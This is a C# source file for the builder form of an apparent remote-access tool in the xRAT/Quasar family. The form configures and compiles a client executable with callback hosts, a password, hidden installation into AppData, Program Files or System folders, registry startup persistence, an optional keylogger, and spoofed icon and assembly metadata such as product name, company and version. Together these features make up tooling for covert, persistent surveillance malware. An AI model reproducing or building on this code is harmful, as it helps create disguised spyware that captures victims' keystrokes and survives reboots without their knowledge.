using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using xServer.Core.Build;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    public partial class FrmBuilder : Form
    {
        private bool _profileLoaded;
        private bool _changed;
        private BindingList<Host> _hosts = new BindingList<Host>();

        public FrmBuilder()
        {
            InitializeComponent();
        }

        private void LoadProfile(string profilename)
        {
            var profile = new BuilderProfile(profilename + ".xml");
            var rawHosts = profile.ReadValueSafe("Hosts");
            foreach (var host in HostHelper.GetHostsList(rawHosts))
                _hosts.Add(host);
            lstHosts.DataSource = new BindingSource(_hosts, null);
            txtTag.Text = profile.ReadValueSafe("Tag", "Office04");
            txtPassword.Text = profile.ReadValueSafe("Password", XMLSettings.Password);
            txtDelay.Text = profile.ReadValueSafe("Delay", "5000");
            txtMutex.Text = profile.ReadValueSafe("Mutex", FormatHelper.GenerateMutex());
            chkInstall.Checked = bool.Parse(profile.ReadValueSafe("InstallClient", "False"));
            txtInstallname.Text = profile.ReadValueSafe("InstallName", "Client");
            GetInstallPath(int.Parse(profile.ReadValueSafe("InstallPath", "1"))).Checked = true;
            txtInstallsub.Text = profile.ReadValueSafe("InstallSub", "SubDir");
            chkHide.Checked = bool.Parse(profile.ReadValueSafe("HideFile", "False"));
            chkStartup.Checked = bool.Parse(profile.ReadValueSafe("AddStartup", "False"));
            txtRegistryKeyName.Text = profile.ReadValueSafe("RegistryName", "Client Startup");
            chkIconChange.Checked = bool.Parse(profile.ReadValueSafe("ChangeIcon", "False"));
            chkChangeAsmInfo.Checked = bool.Parse(profile.ReadValueSafe("ChangeAsmInfo", "False"));
            chkKeylogger.Checked = bool.Parse(profile.ReadValueSafe("Keylogger", "False"));
            txtProductName.Text = profile.ReadValueSafe("ProductName");
            txtDescription.Text = profile.ReadValueSafe("Description");
            txtCompanyName.Text = profile.ReadValueSafe("CompanyName");
            txtCopyright.Text = profile.ReadValueSafe("Copyright");
            txtTrademarks.Text = profile.ReadValueSafe("Trademarks");
            txtOriginalFilename.Text = profile.ReadValueSafe("OriginalFilename");
            txtProductVersion.Text = profile.ReadValueSafe("ProductVersion");
            txtFileVersion.Text = profile.ReadValueSafe("FileVersion");
            _profileLoaded = true;
        }

        private void SaveProfile(string profilename)
        {
            var profile = new BuilderProfile(profilename + ".xml");
            profile.WriteValue("Tag", txtTag.Text);
            profile.WriteValue("Hosts", HostHelper.GetRawHosts(_hosts));
            profile.WriteValue("Password", txtPassword.Text);
            profile.WriteValue("Delay", txtDelay.Text);
            profile.WriteValue("Mutex", txtMutex.Text);
            profile.WriteValue("InstallClient", chkInstall.Checked.ToString());
            profile.WriteValue("InstallName", txtInstallname.Text);
            profile.WriteValue("InstallPath", GetInstallPath().ToString());
            profile.WriteValue("InstallSub", txtInstallsub.Text);
            profile.WriteValue("HideFile", chkHide.Checked.ToString());
            profile.WriteValue("AddStartup", chkStartup.Checked.ToString());
            profile.WriteValue("RegistryName", txtRegistryKeyName.Text);
            profile.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
            profile.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
            profile.WriteValue("Keylogger", chkKeylogger.Checked.ToString());
            profile.WriteValue("ProductName", txtProductName.Text);
            profile.WriteValue("Description", txtDescription.Text);
            profile.WriteValue("CompanyName", txtCompanyName.Text);
            profile.WriteValue("Copyright", txtCopyright.Text);
            profile.WriteValue("Trademarks", txtTrademarks.Text);
            profile.WriteValue("OriginalFilename", txtOriginalFilename.Text);
            profile.WriteValue("ProductVersion", txtProductVersion.Text);
            profile.WriteValue("FileVersion", txtFileVersion.Text);
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            LoadProfile("Default");

            txtPort.Text = XMLSettings.ListenPort.ToString();

            UpdateControlStates();

            ToggleAsmInfoControls();
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed &&
                MessageBox.Show("Do you want to save your current settings?", "Save your settings?",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }

        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (txtHost.Text.Length < 1 || txtPort.Text.Length < 1) return;

            HasChanged();

            var host = txtHost.Text;
            ushort port;
            if (!ushort.TryParse(txtPort.Text, out port))
            {
                MessageBox.Show("Please enter a valid port.", "Builder",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            _hosts.Add(new Host {Hostname = host, Port = port});
            txtHost.Text = "";
            txtPort.Text = "";
        }

        #region "Context Menu"
        private void ctxtRemove_Click(object sender, EventArgs e)
        {
            HasChanged();

            List<string> selectedHosts = (from object arr in lstHosts.SelectedItems select arr.ToString()).ToList();

            foreach (var item in selectedHosts)
            {
                foreach (var host in _hosts)
                {
                    if (item == host.ToString())
                    {
                        _hosts.Remove(host);
                        break;
                    }
                }
            }
        }

        private void ctxtClear_Click(object sender, EventArgs e)
        {
            HasChanged();

            _hosts.Clear();
        }
        #endregion

        #region "Misc"
        private void chkShowPass_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.PasswordChar = (chkShowPass.Checked) ? '\0' : '•';
        }

        private void txtPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
        }

        private void txtDelay_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
        }

        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();

            txtMutex.Text = FormatHelper.GenerateMutex();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            ToggleAsmInfoControls();
        }
        #endregion

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (lstHosts.Items.Count > 0 &&
                !string.IsNullOrEmpty(txtDelay.Text) && // Connection Information
                !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text) && // Client Options
                !chkInstall.Checked ||
                (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text) &&
                 !string.IsNullOrEmpty(txtInstallsub.Text)) && // Installation Options
                !chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text)))
                // Persistence and Registry Features
            {
                string output = string.Empty;
                string icon = string.Empty;

                if (chkIconChange.Checked)
                {
                    using (OpenFileDialog ofd = new OpenFileDialog())
                    {
                        ofd.Filter = "Icons *.ico|*.ico";
                        ofd.Multiselect = false;
                        if (ofd.ShowDialog() == DialogResult.OK)
                            icon = ofd.FileName;
                    }
                }

                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.Filter = "EXE Files *.exe|*.exe";
                    sfd.RestoreDirectory = true;
                    sfd.FileName = "Client-built.exe";
                    if (sfd.ShowDialog() == DialogResult.OK)
                        output = sfd.FileName;
                }

                if (!string.IsNullOrEmpty(output) && (!chkIconChange.Checked || !string.IsNullOrEmpty(icon)))
                {
                    try
                    {
                        string[] asmInfo = null;
                        if (chkChangeAsmInfo.Checked)
                        {
                            if (!FormatHelper.IsValidVersionNumber(txtProductVersion.Text) ||
                                !FormatHelper.IsValidVersionNumber(txtFileVersion.Text))
                            {
                                MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Builder",
                                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                                return;
                            }

                            asmInfo = new string[8];
                            asmInfo[0] = txtProductName.Text;
                            asmInfo[1] = txtDescription.Text;
                            asmInfo[2] = txtCompanyName.Text;
                            asmInfo[3] = txtCopyright.Text;
                            asmInfo[4] = txtTrademarks.Text;
                            asmInfo[5] = txtOriginalFilename.Text;
                            asmInfo[6] = txtProductVersion.Text;
                            asmInfo[7] = txtFileVersion.Text;
                        }

                        ClientBuilder.Build(output, txtTag.Text, HostHelper.GetRawHosts(_hosts), txtPassword.Text, txtInstallsub.Text,
                            txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked,
                            chkHide.Checked, chkKeylogger.Checked, int.Parse(txtDelay.Text), GetInstallPath(), icon, asmInfo,
                            Application.ProductVersion);

                        MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK,
                            MessageBoxIcon.Information);
                    }
                    catch (FileLoadException)
                    {
                        MessageBox.Show("Unable to load the Client Assembly Information.\nPlease re-build the Client.",
                            "Error loading Client", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(
                            string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message,
                                ex.StackTrace), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
                MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
        }

        private void RefreshExamplePath()
        {
            string path = string.Empty;
            if (rbAppdata.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            txtInstallsub.Text), txtInstallname.Text);
            else if (rbProgramFiles.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                            txtInstallsub.Text), txtInstallname.Text);
            else if (rbSystem.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), txtInstallsub.Text),
                        txtInstallname.Text);

            this.Invoke((MethodInvoker)delegate { txtExamplePath.Text = path + ".exe"; });
        }

        private int GetInstallPath()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            return 1;
        }

        private RadioButton GetInstallPath(int installPath)
        {
            switch (installPath)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    return rbAppdata;
            }
        }

        private void ToggleAsmInfoControls()
        {
            this.Invoke((MethodInvoker) delegate
            {
                foreach (Control ctrl in assemblyPage.Controls)
                {
                    var label = ctrl as Label;
                    if (label != null)
                    {
                        label.Enabled = chkChangeAsmInfo.Checked;
                        continue;
                    }

                    var box = ctrl as TextBox;
                    if (box != null)
                        box.Enabled = chkChangeAsmInfo.Checked;
                }
            });
        }

        private void HasChanged()
        {
            if (!_changed && _profileLoaded)
                _changed = true;
        }

        private void UpdateControlStates()
        {
            txtInstallname.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallsub.Enabled = chkInstall.Checked;
            chkHide.Enabled = chkInstall.Checked;
            chkStartup.Enabled = chkInstall.Checked;
            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
        }

        /// <summary>
        /// Handles a basic change in setting.
        /// </summary>
        private void HasChangedSetting(object sender, EventArgs e)
        {
            HasChanged();
        }

        /// <summary>
        /// Handles a basic change in setting, also refreshing the example file path.
        /// </summary>
        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();

            RefreshExamplePath();
        }
    }
}